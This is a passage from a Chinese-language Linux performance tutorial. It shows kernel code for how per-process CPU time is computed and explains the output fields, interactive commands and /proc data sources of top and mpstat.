    seq_put_decimal_ll(m, <span class="hljs-string">" "</span>, ppid);  <span class="hljs-comment">// 父进程 PID</span>
    <span class="hljs-comment">// ... 其他字段</span>
    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, <span class="hljs-type">nsec_to_clock_t</span>(utime));  <span class="hljs-comment">// 用户时间</span>
    seq_put_decimal_ull(m, <span class="hljs-string">" "</span>, <span class="hljs-type">nsec_to_clock_t</span>(stime));  <span class="hljs-comment">// 系统时间</span>
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>关键字段的来源</strong>：</p>
<ol>
<li><strong>PID、PPID</strong>：从 <code>task_struct</code> 直接读取</li>
<li><strong>CPU 时间</strong>：从 <code>task_struct-&gt;utime</code> 和 <code>task_struct-&gt;stime</code> 读取</li>
<li><strong>内存信息</strong>：从 <code>mm_struct</code> 读取</li>
<li><strong>状态</strong>：从 <code>task_struct-&gt;__state</code> 读取</li>
</ol>
<h3 data-id="heading-17">4.2 task_cputime_adjusted() 的作用</h3>
<p><strong>task_cputime_adjusted() 函数</strong>：</p>
<p>这个函数获取进程的 CPU 时间，并进行调整以确保单调性。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">task_cputime_adjusted</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, u64 *ut, u64 *st)</span>
{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_cputime</span> <span class="hljs-title">cputime</span> =</span> {
        .sum_exec_runtime = p-&gt;se.sum_exec_runtime,
    };
    
    task_cputime(p, &amp;cputime.utime, &amp;cputime.stime);
    cputime_adjust(&amp;cputime, &amp;p-&gt;prev_cputime, ut, st);
}
</code></pre>
<p><strong>cputime_adjust() 的作用</strong>：</p>
<p>确保 CPU 时间的单调性，避免因为时钟精度问题导致时间倒退。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// kernel/sched/cputime.c</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">cputime_adjust</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_cputime *curr, <span class="hljs-keyword">struct</span> prev_cputime *prev,
                    u64 *ut, u64 *st)</span>
{
    u64 rtime = curr-&gt;sum_exec_runtime;
    u64 stime = curr-&gt;stime;
    u64 utime = curr-&gt;utime;
    
    <span class="hljs-comment">// 确保 stime + utime == rtime</span>
    <span class="hljs-keyword">if</span> (stime == <span class="hljs-number">0</span>) {
        utime = rtime;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (utime == <span class="hljs-number">0</span>) {
        stime = rtime;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 按比例分配</span>
        stime = mul_u64_u64_div_u64(stime, rtime, stime + utime);
    }
    
    <span class="hljs-comment">// 确保单调性</span>
    <span class="hljs-keyword">if</span> (stime &lt; prev-&gt;stime)
        stime = prev-&gt;stime;
    utime = rtime - stime;
    
    <span class="hljs-keyword">if</span> (utime &lt; prev-&gt;utime) {
        utime = prev-&gt;utime;
        stime = rtime - utime;
    }
    
    prev-&gt;stime = stime;
    prev-&gt;utime = utime;
    *ut = prev-&gt;utime;
    *st = prev-&gt;stime;
}
</code></pre>
<h3 data-id="heading-18">4.3 工具如何计算进程 CPU 使用率</h3>
<p><strong>top 的计算方式</strong>：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// 伪代码示例</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">calculate_process_cpu_usage</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> process_info *proc)</span>
{
    <span class="hljs-comment">// 读取两次 /proc/[pid]/stat</span>
    read_proc_pid_stat(proc-&gt;pid, &amp;stat1);
    sleep(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 等待 1 秒</span>
    read_proc_pid_stat(proc-&gt;pid, &amp;stat2);
    
    <span class="hljs-comment">// 计算 CPU 时间差值</span>
    utime_delta = stat2.utime - stat1.utime;
    stime_delta = stat2.stime - stat1.stime;
    total_cputime = utime_delta + stime_delta;
    
    <span class="hljs-comment">// 计算 CPU 使用率（百分比）</span>
    <span class="hljs-comment">// 注意：多核系统中可能超过 100%</span>
    cpu_percent = (total_cputime * <span class="hljs-number">100.0</span>) / (<span class="hljs-number">1.0</span> * HZ);  <span class="hljs-comment">// HZ 是时钟频率</span>
    
    <span class="hljs-comment">// 计算内存使用率</span>
    mem_percent = (proc-&gt;rss * <span class="hljs-number">100.0</span>) / total_memory;
}
</code></pre>
<p><strong>关键点</strong>：</p>
<ol>
<li><strong>差值计算</strong>：CPU 使用率是时间差值的百分比</li>
<li><strong>多核系统</strong>：如果进程使用多个 CPU 核心，CPU 使用率可能超过 100%</li>
<li><strong>时间单位</strong>：需要将时钟周期转换为秒或百分比</li>
</ol>
<hr/>
<h2 data-id="heading-19">5. top、mpstat、htop 工具详解</h2>
<h3 data-id="heading-20">5.1 top 工具详解</h3>
<h3 data-id="heading-21">2.1 top 是什么？</h3>
<p><strong>top 的定义</strong>：</p>
<p>top 是 Linux 系统中最经典的进程监控工具，用于实时显示系统中运行的进程信息、CPU 使用率、内存使用情况等。</p>
<p><strong>top 的特点</strong>：</p>
<ol>
<li><strong>实时更新</strong>：默认每 3 秒更新一次</li>
<li><strong>交互式</strong>：支持键盘命令操作</li>
<li><strong>详细信息</strong>：显示进程的 CPU、内存、状态等信息</li>
<li><strong>轻量级</strong>：资源占用小，适合生产环境</li>
</ol>
<p><strong>top 的安装</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install procps

<span class="hljs-comment"># CentOS/RHEL</span>
yum install procps-ng

<span class="hljs-comment"># 验证安装</span>
top --version
</code></pre>
<h3 data-id="heading-22">2.2 top 的输出详解</h3>
<p><strong>top 的输出分为两部分</strong>：</p>
<ol>
<li><strong>系统摘要信息</strong>（顶部）</li>
<li><strong>进程列表</strong>（下方）</li>
</ol>
<p><strong>系统摘要信息详解</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">top</span> <span class="hljs-bullet">-</span> <span class="hljs-number">10</span><span class="hljs-string">:30:45</span> <span class="hljs-string">up</span> <span class="hljs-number">5</span> <span class="hljs-string">days,</span>  <span class="hljs-number">2</span><span class="hljs-string">:15,</span>  <span class="hljs-number">3</span> <span class="hljs-string">users,</span>  <span class="hljs-attr">load average:</span> <span class="hljs-number">0.52</span><span class="hljs-string">,</span> <span class="hljs-number">0.58</span><span class="hljs-string">,</span> <span class="hljs-number">0.61</span>
<span class="hljs-attr">Tasks:</span> <span class="hljs-number">285</span> <span class="hljs-string">total,</span>   <span class="hljs-number">1</span> <span class="hljs-string">running,</span> <span class="hljs-number">284</span> <span class="hljs-string">sleeping,</span>   <span class="hljs-number">0</span> <span class="hljs-string">stopped,</span>   <span class="hljs-number">0</span> <span class="hljs-string">zombie</span>
<span class="hljs-string">%Cpu(s):</span>  <span class="hljs-number">5.2</span> <span class="hljs-string">us,</span>  <span class="hljs-number">2.1</span> <span class="hljs-string">sy,</span>  <span class="hljs-number">0.0</span> <span class="hljs-string">ni,</span> <span class="hljs-number">92.5</span> <span class="hljs-string">id,</span>  <span class="hljs-number">0.1</span> <span class="hljs-string">wa,</span>  <span class="hljs-number">0.0</span> <span class="hljs-string">hi,</span>  <span class="hljs-number">0.1</span> <span class="hljs-string">si,</span>  <span class="hljs-number">0.0</span> <span class="hljs-string">st</span>
<span class="hljs-attr">MiB Mem :</span>  <span class="hljs-number">8192.0 </span><span class="hljs-string">total,</span>  <span class="hljs-number">1024.0 </span><span class="hljs-string">free,</span>   <span class="hljs-number">2048.0 </span><span class="hljs-string">used,</span>   <span class="hljs-number">5120.0 </span><span class="hljs-string">buff/cache</span>
<span class="hljs-attr">MiB Swap:</span>  <span class="hljs-number">4096.0 </span><span class="hljs-string">total,</span>  <span class="hljs-number">4096.0 </span><span class="hljs-string">free,</span>     <span class="hljs-number">0.0</span> <span class="hljs-string">used.</span>   <span class="hljs-number">5120.0 </span><span class="hljs-string">avail</span> <span class="hljs-string">Mem</span>
</code></pre>
<p><strong>详细字段说明</strong>：</p>
<ol>
<li>
<p><strong>第一行：系统时间和负载</strong>：</p>
<ul>
<li><strong><code>10:30:45</code></strong>：当前系统时间</li>
<li><strong><code>up 5 days, 2:15</code></strong>：系统运行时间（5 天 2 小时 15 分钟）</li>
<li><strong><code>3 users</code></strong>：当前登录用户数</li>
<li><strong><code>load average: 0.52, 0.58, 0.61</code></strong>：系统负载平均值
<ul>
<li><strong>0.52</strong>：1 分钟平均负载</li>
<li><strong>0.58</strong>：5 分钟平均负载</li>
<li><strong>0.61</strong>：15 分钟平均负载</li>
<li><strong>含义</strong>：负载值表示可运行进程的平均数量</li>
<li><strong>单核 CPU</strong>：负载 1.0 表示 CPU 100% 使用</li>
<li><strong>多核 CPU</strong>：负载值应该除以 CPU 核心数</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>第二行：任务统计</strong>：</p>
<ul>
<li><strong><code>285 total</code></strong>：总进程数</li>
<li><strong><code>1 running</code></strong>：正在运行的进程数</li>
<li><strong><code>284 sleeping</code></strong>：睡眠状态的进程数</li>
<li><strong><code>0 stopped</code></strong>：停止状态的进程数</li>
<li><strong><code>0 zombie</code></strong>：僵尸进程数</li>
</ul>
</li>
<li>
<p><strong>第三行：CPU 使用率</strong>：</p>
<ul>
<li><strong><code>5.2 us</code></strong>：用户空间 CPU 使用率（5.2%）</li>
<li><strong><code>2.1 sy</code></strong>：内核空间 CPU 使用率（2.1%）</li>
<li><strong><code>0.0 ni</code></strong>：nice 调整后的用户空间 CPU 使用率</li>
<li><strong><code>92.5 id</code></strong>：空闲 CPU 百分比（92.5%）</li>
<li><strong><code>0.1 wa</code></strong>：等待 I/O 的 CPU 百分比</li>
<li><strong><code>0.0 hi</code></strong>：硬件中断 CPU 百分比</li>
<li><strong><code>0.1 si</code></strong>：软件中断 CPU 百分比</li>
<li><strong><code>0.0 st</code></strong>：虚拟化环境中被其他虚拟机占用的 CPU 百分比</li>
</ul>
</li>
<li>
<p><strong>第四行：内存使用</strong>：</p>
<ul>
<li><strong><code>8192.0 total</code></strong>：总内存（8 GB）</li>
<li><strong><code>1024.0 free</code></strong>：空闲内存（1 GB）</li>
<li><strong><code>2048.0 used</code></strong>：已使用内存（2 GB）</li>
<li><strong><code>5120.0 buff/cache</code></strong>：缓冲区和缓存内存（5 GB）</li>
</ul>
</li>
<li>
<p><strong>第五行：交换分区使用</strong>：</p>
<ul>
<li><strong><code>4096.0 total</code></strong>：总交换分区（4 GB）</li>
<li><strong><code>4096.0 free</code></strong>：空闲交换分区（4 GB）</li>
<li><strong><code>0.0 used</code></strong>：已使用交换分区（0 GB）</li>
<li><strong><code>5120.0 avail Mem</code></strong>：可用内存（5 GB，包括缓存）</li>
</ul>
</li>
</ol>
<p><strong>进程列表字段详解</strong>：</p>
<pre><code class="hljs language-perl" lang="perl">PID   USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
<span class="hljs-number">1234</span>  root      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>  <span class="hljs-number">1024000</span>  <span class="hljs-number">512000</span>  <span class="hljs-number">256000</span> S  <span class="hljs-number">5.2</span>   <span class="hljs-number">6.2</span>   <span class="hljs-number">10</span>:<span class="hljs-number">30.45</span> test
</code></pre>
<p><strong>字段详细说明</strong>：</p>
<ol>
<li>
<p><strong>PID（Process ID）</strong>：</p>
<ul>
<li><strong>含义</strong>：进程 ID</li>
<li><strong>作用</strong>：唯一标识一个进程</li>
<li><strong>范围</strong>：1-4194304（通常）</li>
</ul>
</li>
<li>
<p><strong>USER</strong>：</p>
<ul>
<li><strong>含义</strong>：进程所有者</li>
<li><strong>作用</strong>：显示进程以哪个用户身份运行</li>
</ul>
</li>
<li>
<p><strong>PR（Priority）</strong>：</p>
<ul>
<li><strong>含义</strong>：进程优先级</li>
<li><strong>范围</strong>：-20 到 19（实时进程为负数）</li>
<li><strong>作用</strong>：影响进程调度优先级</li>
</ul>
</li>
<li>
<p><strong>NI（Nice）</strong>：</p>
<ul>
<li><strong>含义</strong>：nice 值</li>
<li><strong>范围</strong>：-20 到 19</li>
<li><strong>作用</strong>：调整进程优先级（nice 值越小，优先级越高）</li>
</ul>
</li>
<li>
<p><strong>VIRT（Virtual Memory）</strong>：</p>
<ul>
<li><strong>含义</strong>：虚拟内存大小</li>
<li><strong>单位</strong>：KB、MB、GB</li>
<li><strong>作用</strong>：进程可以访问的总虚拟地址空间</li>
</ul>
</li>
<li>
<p><strong>RES（Resident Memory）</strong>：</p>
<ul>
<li><strong>含义</strong>：物理内存使用量（常驻内存）</li>
<li><strong>单位</strong>：KB、MB、GB</li>
<li><strong>作用</strong>：进程实际占用的物理内存</li>
</ul>
</li>
<li>
<p><strong>SHR（Shared Memory）</strong>：</p>
<ul>
<li><strong>含义</strong>：共享内存大小</li>
<li><strong>单位</strong>：KB、MB、GB</li>
<li><strong>作用</strong>：与其他进程共享的内存</li>
</ul>
</li>
<li>
<p><strong>S（Status）</strong>：</p>
<ul>
<li><strong>含义</strong>：进程状态</li>
<li><strong>值</strong>：
<ul>
<li><strong>R（Running）</strong>：正在运行或可运行</li>
<li><strong>S（Sleeping）</strong>：可中断睡眠</li>
<li><strong>D（Disk Sleep）</strong>：不可中断睡眠（通常等待 I/O）</li>
<li><strong>T（Stopped）</strong>：已停止</li>
<li><strong>Z（Zombie）</strong>：僵尸进程</li>
<li><strong>I（Idle）</strong>：空闲（内核线程）</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>%CPU</strong>：</p>
<ul>
<li><strong>含义</strong>：CPU 使用率</li>
<li><strong>计算方式</strong>：进程在采样周期内的 CPU 使用时间 / 采样周期</li>
<li><strong>范围</strong>：0-100%（多核系统可能超过 100%）</li>
</ul>
</li>
<li>
<p><strong>%MEM</strong>：</p>
<ul>
<li><strong>含义</strong>：内存使用率</li>
<li><strong>计算方式</strong>：RES / 总内存 * 100%</li>
<li><strong>范围</strong>：0-100%</li>
</ul>
</li>
<li>
<p><strong>TIME+</strong>：</p>
<ul>
<li><strong>含义</strong>：累计 CPU 时间</li>
<li><strong>格式</strong>：分:秒.毫秒</li>
<li><strong>作用</strong>：显示进程总共使用的 CPU 时间</li>
</ul>
</li>
<li>
<p><strong>COMMAND</strong>：</p>
<ul>
<li><strong>含义</strong>：进程命令</li>
<li><strong>显示</strong>：进程的命令行或程序名</li>
</ul>
</li>
</ol>
<h3 data-id="heading-23">2.3 top 的交互命令</h3>
<p><strong>常用交互命令</strong>：</p>
<ol>
<li>
<p><strong>排序命令</strong>：</p>
<ul>
<li><strong><code>P</code></strong>：按 CPU 使用率排序</li>
<li><strong><code>M</code></strong>：按内存使用率排序</li>
<li><strong><code>T</code></strong>：按运行时间排序</li>
<li><strong><code>N</code></strong>：按 PID 排序</li>
</ul>
</li>
<li>
<p><strong>显示命令</strong>：</p>
<ul>
<li><strong><code>f</code></strong>：选择显示字段</li>
<li><strong><code>o</code></strong>：改变字段显示顺序</li>
<li><strong><code>x</code></strong>：高亮显示排序列</li>
<li><strong><code>b</code></strong>：切换粗体显示</li>
</ul>
</li>
<li>
<p><strong>进程操作</strong>：</p>
<ul>
<li><strong><code>k</code></strong>：杀死进程（需要输入 PID）</li>
<li><strong><code>r</code></strong>：修改进程优先级（nice 值）</li>
<li><strong><code>d</code></strong>：修改更新延迟</li>
</ul>
</li>
<li>
<p><strong>其他命令</strong>：</p>
<ul>
<li><strong><code>h</code></strong>：显示帮助</li>
<li><strong><code>q</code></strong>：退出 top</li>
<li><strong><code>1</code></strong>：切换显示所有 CPU 或汇总</li>
<li><strong><code>u</code></strong>：按用户过滤进程</li>
</ul>
</li>
</ol>
<h3 data-id="heading-24">2.4 top 的配置</h3>
<p><strong>配置文件</strong>：</p>
<p>top 的配置文件位于 <code>~/.toprc</code>，可以保存用户的设置。</p>
<p><strong>常用配置</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 设置更新延迟（秒）</span>
top -d 1  <span class="hljs-comment"># 每 1 秒更新一次</span>

<span class="hljs-comment"># 只显示特定用户的进程</span>
top -u username

<span class="hljs-comment"># 批处理模式（适合脚本）</span>
top -b -n 1  <span class="hljs-comment"># 运行一次后退出</span>

<span class="hljs-comment"># 显示特定 PID 的进程</span>
top -p 1234,5678
</code></pre>
<p><strong>批处理模式示例</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 保存 top 输出到文件</span>
top -b -n 1 &gt; top_output.txt

<span class="hljs-comment"># 在脚本中使用</span>
top -b -n 1 | grep <span class="hljs-string">"test"</span>
</code></pre>
<h3 data-id="heading-25">2.5 top 的数据来源</h3>
<p><strong>top 从 /proc 文件系统读取数据</strong>：</p>
<ol>
<li>
<p><strong><code>/proc/stat</code></strong>：系统整体统计信息</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/stat
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># cpu  12345 0 5678 89012 1234 0 567 0 0 0</span>
<span class="hljs-comment"># cpu0 1234 0 567 8901 123 0 56 0 0 0</span>
<span class="hljs-comment"># ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/[pid]/stat</code></strong>：进程统计信息</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/1234/stat
<span class="hljs-comment"># 输出：PID comm state ppid pgrp session tty_nr tpgid flags ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/[pid]/status</code></strong>：进程详细状态</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/1234/status
<span class="hljs-comment"># 输出：Name, State, Pid, PPid, ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/meminfo</code></strong>：内存信息</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/meminfo
<span class="hljs-comment"># 输出：MemTotal, MemFree, MemAvailable, ...</span>
</code></pre>
</li>
<li>
<p><strong><code>/proc/loadavg</code></strong>：系统负载</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/loadavg
<span class="hljs-comment"># 输出：0.52 0.58 0.61 2/285 12345</span>
</code></pre>
</li>
</ol>
<p><strong>数据更新机制</strong>：</p>
<ul>
<li>top 定期读取 <code>/proc</code> 文件系统</li>
<li>计算两次读取之间的差值</li>
<li>显示统计信息</li>
</ul>
<hr/>
<h2 data-id="heading-26">3. mpstat 工具详解</h2>
<h3 data-id="heading-27">3.1 mpstat 是什么？</h3>
<p><strong>mpstat 的定义</strong>：</p>
<p>mpstat（Multi-Processor Statistics）是 sysstat 工具包中的一个工具，用于显示每个 CPU 核心的详细统计信息。</p>
<p><strong>mpstat 的特点</strong>：</p>
<ol>
<li><strong>多核支持</strong>：显示每个 CPU 核心的统计信息</li>
<li><strong>详细统计</strong>：提供更详细的 CPU 统计信息</li>
<li><strong>命令行工具</strong>：适合脚本和自动化</li>
<li><strong>历史数据</strong>：可以显示历史统计信息</li>
</ol>
<p><strong>mpstat 的安装</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Debian/Ubuntu</span>
apt-get install sysstat

<span class="hljs-comment"># CentOS/RHEL</span>
yum install sysstat

<span class="hljs-comment"># 验证安装</span>
mpstat --version
</code></pre>
<h3 data-id="heading-28">3.2 mpstat 的输出详解</h3>
<p><strong>基本用法</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 显示所有 CPU 的统计信息</span>
mpstat

<span class="hljs-comment"># 每 2 秒更新一次，共 5 次</span>
mpstat 2 5

<span class="hljs-comment"># 显示每个 CPU 核心的统计信息</span>
mpstat -P ALL

<span class="hljs-comment"># 显示特定 CPU 核心的统计信息</span>
mpstat -P 0,1
</code></pre>
<p><strong>mpstat 输出示例</strong>：</p>
<pre><code class="hljs language-perl" lang="perl">Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">147</span> (mr536)  <span class="hljs-number">12</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2025</span>  _aarch64<span class="hljs-number">_</span>  (<span class="hljs-number">4</span> CPU)

<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>     CPU    %usr   %nice    %sys   %iowait    %irq   %soft  %steal  %guest  %gnice   %idle
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>     all    <span class="hljs-number">5.20</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">2.10</span>      <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">92.50</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">0</span>    <span class="hljs-number">6.00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">2.50</span>      <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">20</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">91.30</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">1</span>    <span class="hljs-number">4.50</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">1.80</span>      <span class="hljs-number">0</span>.<span class="hljs-number">20</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">93.50</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">2</span>    <span class="hljs-number">5.80</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">2.20</span>      <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">91.80</span>
<span class="hljs-number">10</span>:<span class="hljs-number">30</span>:<span class="hljs-number">45</span>       <span class="hljs-number">3</span>    <span class="hljs-number">4.30</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">1.90</span>      <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">10</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>    <span class="hljs-number">0</span>.<span class="hljs-number">00</span>   <span class="hljs-number">93.60</span>
</code></pre>
<p><strong>字段详细说明</strong>：</p>
<ol>
<li>
<p><strong>CPU</strong>：</p>
<ul>
<li><strong><code>all</code></strong>：所有 CPU 的平均值</li>
<li><strong><code>0, 1, 2, 3</code></strong>：各个 CPU 核心的编号</li>
</ul>
</li>
<li>
<p><strong>%usr（User）</strong>：</p>
<ul>
<li><strong>含义</strong>：用户空间 CPU 使用率</li>
<li><strong>计算方式</strong>：用户空间进程的 CPU 时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%us</code></li>
</ul>
</li>
<li>
<p><strong>%nice</strong>：</p>
<ul>
<li><strong>含义</strong>：nice 调整后的用户空间 CPU 使用率</li>
<li><strong>计算方式</strong>：nice 值不为 0 的进程的 CPU 时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%ni</code></li>
</ul>
</li>
<li>
<p><strong>%sys（System）</strong>：</p>
<ul>
<li><strong>含义</strong>：内核空间 CPU 使用率</li>
<li><strong>计算方式</strong>：内核代码的 CPU 时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%sy</code></li>
</ul>
</li>
<li>
<p><strong>%iowait（I/O Wait）</strong>：</p>
<ul>
<li><strong>含义</strong>：等待 I/O 的 CPU 百分比</li>
<li><strong>计算方式</strong>：CPU 空闲且等待 I/O 完成的时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%wa</code></li>
<li><strong>注意</strong>：iowait 高可能表示 I/O 瓶颈</li>
</ul>
</li>
<li>
<p><strong>%irq（Interrupt）</strong>：</p>
<ul>
<li><strong>含义</strong>：硬件中断 CPU 百分比</li>
<li><strong>计算方式</strong>：处理硬件中断的时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%hi</code></li>
</ul>
</li>
<li>
<p><strong>%soft（Software Interrupt）</strong>：</p>
<ul>
<li><strong>含义</strong>：软件中断 CPU 百分比</li>
<li><strong>计算方式</strong>：处理软件中断的时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%si</code></li>
</ul>
</li>
<li>
<p><strong>%steal（Steal Time）</strong>：</p>
<ul>
<li><strong>含义</strong>：虚拟化环境中被其他虚拟机占用的 CPU 百分比</li>
<li><strong>计算方式</strong>：被 hypervisor 占用的 CPU 时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%st</code></li>
<li><strong>注意</strong>：steal 高表示虚拟机资源不足</li>
</ul>
</li>
<li>
<p><strong>%guest（Guest）</strong>：</p>
<ul>
<li><strong>含义</strong>：运行虚拟机的 CPU 百分比</li>
<li><strong>计算方式</strong>：运行虚拟机的时间 / 总时间</li>
</ul>
</li>
<li>
<p><strong>%gnice（Guest Nice）</strong>：</p>
<ul>
<li><strong>含义</strong>：nice 调整后的虚拟机 CPU 百分比</li>
</ul>
</li>
<li>
<p><strong>%idle（Idle）</strong>：</p>
<ul>
<li><strong>含义</strong>：空闲 CPU 百分比</li>
<li><strong>计算方式</strong>：CPU 空闲时间 / 总时间</li>
<li><strong>与 top 的关系</strong>：对应 top 的 <code>%id</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-29">3.3 mpstat 的高级用法</h3>
<p><strong>显示中断统计</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 显示每个 CPU 的中断统计</span>
mpstat -I SUM

<span class="hljs-comment"># 显示特定中断的统计</span>
mpstat -I SCPU
</code></pre>
<p><strong>输出示例</strong>：</p>
<pre><code class="hljs language-makefile" lang="makefile">Linux 5.15.147 (mr536)  12/15/2025  _aarch64_  (4 CPU)

<span class="hljs-section">10:30:45     CPU    intr/s</span>
<span class="hljs-section">10:30:45     all   1234.56</span>
<span class="hljs-section">10:30:45       0    345.67</span>
<span class="hljs-section">10:30:45       1    234.56</span>
<span class="hljs-section">10:30:45       2    345.67</span>
<span class="hljs-section">10:30:45       3    308.66</span>
</code></pre>
<p><strong>显示 CPU 频率</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 显示 CPU 频率信息（如果支持）</span>
mpstat -f
</code></pre>
<p><strong>JSON 格式输出</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 以 JSON 格式输出（某些版本支持）</span>
mpstat -o JSON
</code></pre>
<h3 data-id="heading-30">3.4 mpstat 的数据来源</h3>
<p><strong>mpstat 从 /proc/stat 读取数据</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /proc/stat
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># cpu  12345 0 5678 89012 1234 0 567 0 0 0</span>
<span class="hljs-comment"># cpu0 1234 0 567 8901 123 0 56 0 0 0</span>
<span class="hljs-comment"># cpu1 1234 0 567 8901 123 0 56 0 0 0</span>
<span class="hljs-comment"># ...</span>
</code></pre>
<p><strong>/proc/stat 字段含义</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">cpu  <span class="hljs-keyword">user</span> nice <span class="hljs-keyword">system</span> idle iowait irq softirq steal guest guest_nice
</code></pre>
<ul>
<li><strong>user</strong>：用户空间 CPU 时间（jiffies）</li>
<li><strong>nice</strong>：nice 调整后的用户空间 CPU 时间</li>
<li><strong>system</strong>：内核空间 CPU 时间</li>
<li><strong>idle</strong>：空闲 CPU 时间</li>
<li><strong>iowait</strong>：等待 I/O 的 CPU 时间</li>
<li><strong>irq</strong>：硬件中断 CPU 时间</li>
<li><strong>softirq</strong>：软件中断 CPU 时间</li>
<li><strong>steal</strong>：被其他虚拟机占用的 CPU 时间</li>
<li><strong>guest</strong>：运行虚拟机的 CPU 时间</li>
<li><strong>guest_nice</strong>：nice 调整后的虚拟机 CPU 时间</li>
</ul>
<p><strong>计算方式</strong>：</p>
<p>mpstat 读取两次 <code>/proc/stat</code>，计算差值，然后除以时间间隔：</p>
<pre><code class="hljs language-ini" lang="ini">%<span class="hljs-attr">usr</span> = (user2 - user1) / (total2 - total1) * <span class="hljs-number">100</span>%
</code></pre>
